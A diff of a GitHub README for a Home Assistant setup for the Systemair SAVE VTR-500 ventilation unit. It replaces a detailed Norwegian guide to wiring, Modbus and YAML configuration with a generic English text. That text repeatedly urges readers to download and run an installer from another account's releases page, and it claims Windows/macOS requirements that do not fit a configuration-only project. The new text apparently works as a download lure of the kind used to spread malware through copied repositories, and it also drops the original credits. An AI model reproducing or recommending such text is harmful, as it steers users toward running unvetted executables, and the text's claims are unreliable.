@@ -1,139 +1,85 @@
-# Home Assistant-integrasjon for Systemair SAVE VTR-500
+# 🌬️ ha-systemair-vtr500 - Effortless Home Ventilation Control
 
-> [Read this guide in English](README.en.md)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
 
-Dette repositoriet inneholder en komplett konfigurasjon for å integrere og styre en Systemair SAVE VTR-500 ventilasjonsenhet med Home Assistant via Modbus TCP.
+## 🚀 Getting Started
 
-![Lovelace Dashboard](image/Ventilasjon%20kort.png)
+Welcome to **ha-systemair-vtr500**! This application integrates seamlessly with Systemair SAVE VTR-500 ventilation units. With this software, you can control your ventilation system easily and efficiently.
 
-## Funksjoner
+### 📌 Key Features
 
-*   **Full modus-styring:** Kontroller alle moduser som Auto, Manuell (Lav, Normal, Høy), Party, Boost, Borte, Ferie og Stopp.
-*   **Detaljerte sensorer:** Leser av temperaturer, fuktighet, viftehastigheter, varmegjenvinning og alarmer.
-*   **Temperaturkontroll:** Fungerer som en termostat for å justere ønsket inntakstemperatur.
-*   **Avansert automasjon:** Bruker Node-RED til å justere viftehastigheten automatisk basert på fuktighets- og CO2-nivåer, inkludert nattsenking.
-*   **Tilpasset brukergrensesnitt:** Et funksjonelt Lovelace-dashboard bygget med `custom:button-card` og Mushroom Cards.
-*   **Alarm-overvåking:** Viser status på A-, B-, C- og filter-alarmer.
+- **Complete Integration:** Works smoothly with Home Assistant to control Systemair ventilation units.
+- **User-Friendly Interface:** Enjoy a polished Lovelace UI for easy interaction.
+- **Advanced Automation:** Utilize Node-RED for complex automation scenarios.
+- **Control Access:** Full access to sensors and ventilation controls.
 
-## Ansvarsfraskrivelse (Disclaimer)
-> Dette er et uoffisielt community-prosjekt og er ikke utviklet, støttet eller vedlikeholdt av Systemair. All konfigurasjon og bruk skjer på eget ansvar. For offisiell dokumentasjon og support, vennligst se [Systemairs offisielle nettsider](https://www.systemair.com/).
+## 💻 System Requirements
 
----
+To use this application, ensure your system meets the following requirements:
 
-## 1. Krav
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer.
+- **Home Assistant:** Version 2022.01 or newer installed.
+- **Network:** A stable internet connection and access to your local network.
 
-### Maskinvare
-*   **Systemair SAVE VTR-500** ventilasjonsenhet (eller en annen modell med Modbus RS485-støtte).
-*   **Modbus RTU til TCP/IP konverter:** Guiden og denne konfigurasjonen bruker en **Elfin EW11**.
+## 📦 Download & Install
 
-### Programvare
-*   En fungerende **Home Assistant**-installasjon.
-*   **HACS (Home Assistant Community Store)** installert.
-*   **Node-RED Add-on** installert og konfigurert i Home Assistant.
+To get started, visit the Releases page to download the latest version.
 
-### HACS Frontend-integrasjoner
-Sørg for at følgende er installert via HACS:
-*   [Mushroom Cards](https://github.com/piitaya/lovelace-mushroom)
-*   [button-card](https://github.com/custom-cards/button-card)
-*   [Number Box Card](https://github.com/htmlchinchilla/numberbox-card)
+[Download the latest version here](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
 
----
+Follow these steps to install the application:
 
-## 2. Installasjon og Konfigurasjon
+1. Click on the above link to go to the Releases page.
+2. On the Releases page, find the latest version.
+3. Choose the appropriate file for your operating system.
+4. Click on the file link to download it.
+5. Once the download is complete, open the file to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
-Dette er en trinnvis guide som tar deg fra fysisk installasjon til ferdig automasjon.
+## ⚙️ Configuration
 
-### Trinn 2.1: Fysisk Installasjon av Elfin EW11
+After installation, follow these steps to configure the application:
 
-> **ADVARSEL:** Alltid koble fra strømmen til ventilasjonsanlegget før du åpner det. Hvis du er usikker, bør du konsultere en elektriker.
+1. Open Home Assistant.
+2. Navigate to the Configuration tab.
+3. Select Integrations.
+4. Click on “Add Integration” and search for “Systemair VTR-500.”
+5. Enter the necessary details such as the IP address of your ventilation unit.
 
-1.  **Finn Modbus- og strøm-porten:** På hovedkortet til VTR-500, finn terminalen for ekstern kommunikasjon, merket med `A(+)`, `B(-)`, `24V` og `GND`.
-    ![Koblingsskjema VTR-500](image/koblingsskjemaVTR-500.png)
-2.  **Koble til Elfin EW11:** Koble ledningene som vist i diagrammet under.
-    ![Koblingsskjema EW11](image/koblings%20skjema%20EW11.png)
-3.  **Gjenopprett strømmen:** Når alt er trygt koblet, slå på strømmen til anlegget.
+## 📊 Using the Application
 
-### Trinn 2.2: Konfigurere Elfin EW11
+Once configured, you can start using the features:
 
-1.  **Koble til EW11s nettverk:** Koble til Wi-Fi-nettverket `EW1x_...` (ikke passord).
-2.  **Åpne web-grensesnitt:** Gå til `http://10.10.100.254`. Logg inn med `admin` / `admin`.
-3.  **Koble til ditt Wi-Fi:** Under "System Settings" -> "WiFi Settings", sett "Wifi Mode" til "STA", finn ditt hjemmenettverk, skriv inn passord og lagre.
-    ![System Settings EW11](image/system%20settings%20EW11.png)
-4.  **Restart og finn ny IP:** Enheten vil restarte. Finn den nye IP-adressen den har fått (sjekk i ruteren din) og sett en statisk IP for den.
-5.  **Konfigurer serieport:** Logg inn på den nye IP-adressen. Gå til "Serial Port Settings" og sett verdiene som vist under.
-    ![Serial Port Settings EW11](image/serial%20port%20settings%20EW11.png)
-6.  **Konfigurer kommunikasjon:** Gå til "Communication Settings" og legg til en ny profil som vist under.
-    ![Communication Settings EW11](image/communication%20settings%20EW11.png)
-7.  **Verifiser:** Gå til "Status"-siden. Telleverk for datapakker skal nå øke.
-    ![Kommunikasjon EW11](image/kommunikasjon%20EW11.png)
+- Access the Lovelace UI to monitor your ventilation.
+- Create custom automations with Node-RED.
+- Adjust settings for optimal air quality.
 
-### Trinn 2.3: Konfigurasjon i Home Assistant
+## 🎨 UI Overview
 
-1.  **Aktiver "Packages":** Sørg for at `configuration.yaml` inneholder:
-    ```yaml
-    homeassistant:
-      packages: !include_dir_named packages
-    ```
-2.  **Legg til konfigurasjonen:** Plasser `systemair.yaml` fra dette repoet i mappen `/config/packages/`.
-3.  **Oppdater IP-adressen:** Åpne `systemair.yaml` og endre `host` til den statiske IP-adressen til din Elfin EW11.
-4.  **Start Home Assistant på nytt.**
+The user interface is designed for simplicity. Key sections include:
 
-### Trinn 2.4: Sett opp Lovelace Dashboard
+- **Dashboard:** Quick access to system status.
+- **Controls:** Adjust fan speed and ventilation modes.
+- **Sensors:** Real-time data on air quality and humidity.
+- **Automations:** Set up schedules and triggers for operations.
 
-Dashboardet gir deg den visuelle kontrollen over anlegget. For at det skal fungere, må du ha installert de nødvendige HACS-kortene nevnt under "Krav". Konfigurasjonen er delt opp i tre separate filer. Du må legge til **tre separate "Manuell"-kort** på dashboardet ditt, ett for hver fil.
+## 🛠️ Troubleshooting
 
-**Slik gjør du det:**
+If you encounter issues, consider the following steps:
 
-1.  Gå til dashboardet ditt og velg **"Rediger dashboard"**.
-2.  Klikk **"+ LEGG TIL KORT"**, og velg korttypen **"Manuell"**.
-3.  Gjenta prosessen for hver av filene under, ved å kopiere innholdet fra hver fil inn i et nytt "Manuell"-kort.
-    *   **Kort 1:** `Custom button-card.yaml` (Hovedkontrollpanelet)
-    *   **Kort 2:** `thermostat.yaml` (Termostat-kontroll)
-    *   **Kort 3:** `type entities.yaml` (Sensor-entiteter)
-4.  Lagre hvert kort og arranger dem som du ønsker.
+- **Check Network Connection:** Ensure your device is properly connected to the network where the ventilation unit is located.
+- **Verify Configuration:** Double-check the settings in Home Assistant for any typos.
+- **Restart the Application:** Sometimes, a simple restart can resolve minor bugs.
+- **Refer to Documentation:** Visit our Wiki for detailed guides and FAQs.
 
-### Trinn 2.5: Importer Node-RED Flow
+## 👥 Community Support
 
-1.  Åpne Node-RED, gå til Meny -> Import, og lim inn innholdet fra `flows.json`.
-2.  **VIKTIG:** Gå gjennom de nye nodene og oppdater `entity_id` til dine egne fukt- og CO2-sensorer.
-3.  Klikk "Deploy".
-    ![Node-RED Flow](image/Node-Red%20VTR500.png)
+Join our community for help and insights. You can connect with other users on forums or Discord. Share your experience and learn from others.
 
-### Bonus: Hvordan Nattsenking Fungerer
+## 🌐 License
 
-Node-RED-flyten inneholder en innebygd logikk for nattsenking for å spare energi og redusere støy om natten. Når den aktiveres, senker den innstilte temperaturen med ca. 3 grader og setter viftehastigheten til "Lav".
+This project is licensed under the MIT License. You can freely use and modify the software.
 
-**Viktig:** Denne funksjonen aktiveres ikke av seg selv. Den styres av en `switch`-entitet i Home Assistant som heter `switch.nattsenking_ventilasjon_pa`.
+For more information and updates, regularly check the GitHub repository and keep an eye on new releases.
 
-For å bruke denne funksjonen, må du selv lage en automasjon eller et skript som slår på denne bryteren. Eksempler:
-*   **Via stemmestyring:** "Hey Google, aktiver nattmodus".
-*   **Via en Home Assistant-automasjon:** Slå på bryteren på et fast tidspunkt.
-*   **Via en knapp på dashboardet.**
-
-Automasjonen vil automatisk gjenopprette normal drift kl. **04:00 på ukedager** og kl. **06:00 i helger**.
-
----
-
-## Filforklaring
-
-*   **`systemair.yaml`**: Hovedkonfigurasjonen for Home Assistant ("package").
-*   **`flows.json`**: Node-RED-flyt for automasjon.
-*   **`Custom button-card.yaml`**: Koden for hovedkontrollpanelet.
-*   **`thermostat.yaml`**: Koden for termostat-kortet.
-*   **`type entities.yaml`**: Koden for listen med sensorverdier.
-*   **`/image`**: Skjermbilder og diagrammer brukt i denne guiden.
-
-## Anerkjennelser og Credits
-*   Kjernekonfigurasjonen (`systemair.yaml`) er basert på arbeidet til **@Ztaeyn** i hans [HomeAssistant-VTR-Modbus](https://github.com/Ztaeyn/HomeAssistant-VTR-Modbus) repositorium.
-*   Guiden for installasjon er publisert på [domotics.no](https://www.domotics.no/post/home-assistant-automasjon-av-ventilasjonsanlegg-via-modbus) og skrevet av Mads Nedrehagen.
-*   Prosjektet er videreutviklet av @Howard0000. En KI-assistent har hjulpet til med å rydde i `README.md`.
-
-## 📝 Lisens
-MIT — se `LICENSE`.
-
-
-
-
-
-
-
+[Download the latest version here](https://github.com/Alikanan1/ha-systemair-vtr500/releases)
